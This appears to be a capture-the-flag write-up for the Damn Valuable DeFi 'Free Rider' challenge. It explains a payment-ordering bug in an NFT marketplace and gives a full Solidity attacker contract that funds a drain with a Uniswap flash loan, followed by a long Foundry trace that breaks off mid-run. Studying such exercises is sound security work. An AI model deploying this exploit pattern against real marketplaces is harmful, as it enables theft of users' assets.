## Free Rider Challenge:

## Challenge Overview:
A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don’t know how to save them!

They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract.

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.

**Simply**:
In this challenge, the player is given only 15 ETH and needs to rescue 6 NFTs from a vulnerable marketplace where each NFT is priced at 15 ETH. This seems impossible at first glance, as buying all NFTs would cost 90 ETH. However, by using a flash loan and exploiting a critical vulnerability in the marketplace contract, the attacker can obtain all NFTs and send them to a recovery contract in a single transaction.

## Understanding onERC721Received in ERC-721 Token Transfers:

**What I Learned**:

I encountered this function in a smart contract security challenge. It is used to safely receive ERC-721 NFTs and contains several security checks and logic that executes once all required NFTs are received.

#### KeyFunction:
```solidity
//this used for this challenge
function onERC721Received(
    address,
    address,
    uint256 _tokenId,
    bytes memory _data
) external override nonReentrant returns (bytes4) {
    if (msg.sender != address(nft)) {
        revert CallerNotNFT();
    }

    if (tx.origin != beneficiary) {
        revert OriginNotBeneficiary();
    }

    if (_tokenId > 5) {
        revert InvalidTokenID(_tokenId);
    }

    if (nft.ownerOf(_tokenId) != address(this)) {
        revert StillNotOwningToken(_tokenId);
    }

    if (++received == 6) {
        address recipient = abi.decode(_data, (address));
        payable(recipient).sendValue(bounty);
    }

    return IERC721Receiver.onERC721Received.selector;
}

```
#### What This Function Does:

1. Handles NFT Transfers: This is triggered when the contract receives an NFT using safeTransferFrom.

2. Security Checks:

   >  Only the official nft contract can call this.

   >  Only the original beneficiary can initiate the transfer (via tx.origin).

   >  The token ID must be in an allowed range (≤ 5).

   >  After transfer, the contract must own the NFT (protection against transfer failures).

3. Bounty Logic: When 6 NFTs are received, it decodes the _data to get the recipient address and sends the bounty.

4. NonReentrant Modifier: Protects against reentrancy attacks (critical when sending ETH).

#### Why It’s Important

Secure NFT logic is essential when building systems that use NFTs for access, voting, or ownership.

This code demonstrates a safe pattern for handling onERC721Received and verifying the source, token, and sender.

##  Vulnerability Explanation:
The core vulnerability lies in how the `FreeRiderNFTMarketplace` handles ETH payments. When someone buys an NFT, the contract transfers the ETH payment to the **current owner of the NFT**, which — during the exploit — happens to be the **buyer themselves**. This happens because the NFT is transferred to the buyer *before* the payment is made.

As a result:
- The buyer buys an NFT.
- The NFT is transferred to them.
- Then the contract tries to pay the "seller" (who is now the buyer).
- So the buyer gets refunded with their own ETH.
- This allows them to repeat the process and buy all NFTs without actually spending ETH.

In other words, **the attacker buys NFTs and immediately receives back the ETH paid**, allowing them to acquire all NFTs essentially for free, using a flash loan for the initial capital.


## Vulnerable Code:
```solidity

// The attacker initiates the exploit by calling the buyMany() function using a flash loan of 15 ETH.
// These 15 ETH are cycled back to the buyer due to the contract logic, allowing repeated calls to buyMany()
// without spending additional ETH. This loop continues until all NFTs are acquired.
// Once all NFTs are collected, the attacker repays the flash loan along with the fee to the Uniswap pair.
// Finally, the remaining bounty reward of 45 ETH is transferred to the attacker’s (player’s) address as profit.

function buyMany(
        uint256[] calldata tokenIds
    ) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            unchecked {
                _buyOne(tokenIds[i]);
            }
        }
    }

   function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0) {
            revert TokenNotOffered(tokenId);
        }

        if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId); 

        // pay seller using cached token
        //@audit again eth send to the buyer(bug here)
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }
```
## Exploiter Strategy:
The attacker uses a Uniswap flash loan to temporarily borrow 15 ETH worth of WETH, unwraps it to ETH, and uses it to buy all 6 NFTs one by one. Thanks to the vulnerability, each payment is refunded back, allowing re-use of the same ETH for all NFTs.

Steps:

1. Borrow 15 ETH worth of WETH via flash loan.

2. Unwrap WETH to ETH.

3. Call buyMany() on the vulnerable marketplace.

4. ETH used in each buy() is refunded to attacker.

5. Transfer all NFTs to the recovery contract.
   
6. Recovery Account pays the rewards to the player(45 ether)

7. Repay the flash loan + fee.

### Exploit Code:
```solidity

  function test_freeRider() public checkSolvedByPlayer {
        FreeRiderAttacker rideAttack = new FreeRiderAttacker{value: 0.04 ether}(
            address(uniswapPair),
            address(marketplace),
            address(nft),
            address(recoveryManager),
            address(weth)
        );
        rideAttack.attack();
    }

//Attacker Contract

    interface IFreeRideMarket {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FreeRiderAttacker {
    IFreeRideMarket public market;
    IERC721 public nft;
    IWETH public weth;
    IUniswapV2Pair public uniswapPair;
    address public recoveryAccount;
    address public player;
    uint256 NFT_PRICE = 15 ether;
    uint256[] tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        address _uniswapPair,
        address marketplace,
        address _nft,
        address recoveryManager,
        address _weth
    ) payable {
        market = IFreeRideMarket(marketplace);
        nft = IERC721(_nft);
        weth = IWETH(_weth);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        recoveryAccount = recoveryManager;
        player = msg.sender;
    }

    function attack() public {
        uniswapPair.swap(NFT_PRICE, 0, address(this), "0x"); //asking for flashLoan and call to the uniswapV2call
    }

    function uniswapV2Call(
        address,
        uint256, ///amount0,
        uint256, //amount1,
        bytes calldata
    ) external {
        require(msg.sender == address(uniswapPair), "Not Uniswap Pair");
        require(tx.origin == player, "Not Player");
        weth.withdraw(NFT_PRICE);
        market.buyMany{value: NFT_PRICE}(tokens); // i have only 15 ether but i can buy all the 6 nfts ,because of vulnerability in the marketplace
        bytes memory data = abi.encode(player);
        for (uint256 i = 0; i < tokens.length; i++) {
            nft.safeTransferFrom(address(this), recoveryAccount, i, data);
        }

        uint256 amountTopay = NFT_PRICE + ((NFT_PRICE * 3) / 997) + 1; //0.3%fee
        weth.deposit{value: amountTopay}();
        weth.transfer(address(uniswapPair), amountTopay);

        //why this is mandatory onERC721Received ?:
        // The Uniswap V2 pair will call this function to confirm the transfer of NFTs
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

```

### Proof Of Exploit:
***using foundry tool to test the exploit ***

```yaml

Ran 1 test for test/free-rider/FreeRider.t.sol:FreeRiderChallenge
[PASS] test_freeRider() (gas: 1781734)
Traces:
  [1893334] FreeRiderChallenge::test_freeRider()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [1229179] → new FreeRiderAttacker@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 4681 bytes of code
    ├─ [522846] FreeRiderAttacker::attack()
    │   ├─ [518838] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::swap(15000000000000000000 [1.5e19], 0, FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0x3078)
    │   │   ├─ [30307] WETH::transfer(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 15000000000000000000 [1.5e19])
    │   │   │   ├─ emit Transfer(from: 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, to: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15000000000000000000 [1.5e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [456454] FreeRiderAttacker::uniswapV2Call(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 15000000000000000000 [1.5e19], 0, 0x3078)
    │   │   │   ├─ [16483] WETH::withdraw(15000000000000000000 [1.5e19])
    │   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: 0x0000000000000000000000000000000000000000, amount: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ emit Withdrawal(to: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [234831] FreeRiderNFTMarketplace::buyMany{value: 15000000000000000000}([0, 1, 2, 3, 4, 5])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(0) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [42284] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 0)
    │   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 0, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 0, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(1) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 1)
    │   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 1, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 1, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(2) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 2)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 2)
    │   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 2, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 2, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(3) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 3)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 3)
    │   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 3, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 3, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(4) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 4)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 4)
    │   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 4, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 4, price: 15000000000000000000 [1.5e19])
    │   │   │   │   ├─ [3051] DamnValuableNFT::ownerOf(5) [staticcall]
    │   │   │   │   │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    │   │   │   │   ├─ [13584] DamnValuableNFT::safeTransferFrom(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 5)
    │   │   │   │   │   ├─ emit Transfer(from: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], to: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 5)
    │   │   │   │   │   ├─ [1756] FreeRiderAttacker::onERC721Received(FreeRiderNFTMarketplace: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], 5, 0x)
    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]
    │   │   │   │   │   └─ ← [Return] FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219]
    │   │   │   │   ├─ [55] FreeRiderAttacker::receive{value: 15000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ emit NFTBought(buyer: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokenId: 5, price: 15000000000000000000 [1.5e19])
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [62760] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 0, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 0)
    │   │   │   │   ├─ [31045] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 1, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 1)
    │   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 2, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 2)
    │   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 2, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 3, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 3)
    │   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 3, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 4, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 4)
    │   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 4, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [21967] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], 5, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], tokenId: 5)
    │   │   │   │   ├─ [14652] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 5, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)
    │   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6]
    │   │   │   │   │   ├─ [0] player::fallback{value: 45000000000000000000}()
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return] 0x150b7a02
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [24345] WETH::deposit{value: 15045135406218655968}()
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15045135406218655968 [1.504e19])
    │   │   │   │   ├─ emit Deposit(who: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15045135406218655968 [1.504e19])
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [3607] WETH::transfer(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, 15045135406218655968 [1.504e19])
    │   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, amount: 15045135406218655968 [1.504e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ [825] WETH::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]
    │   │   │   └─ ← [Return] 9000045135406218655968 [9e21]
    │   │   ├─ [2802] DamnValuableToken::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]
    │   │   │   └─ ← [Return] 15000000000000000000000 [1.5e22]
    │   │   ├─ emit Sync(reserve0: 9000045135406218655968 [9e21], reserve1: 15000000000000000000000 [1.5e22])
    │   │   ├─ emit Swap(sender: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount0In: 15045135406218655968 [1.504e19], amount1In: 0, amount0Out: 15000000000000000000 [1.5e19], amount1Out: 0, to: FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [29235] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 0)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 0)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 1)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 1)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 2)
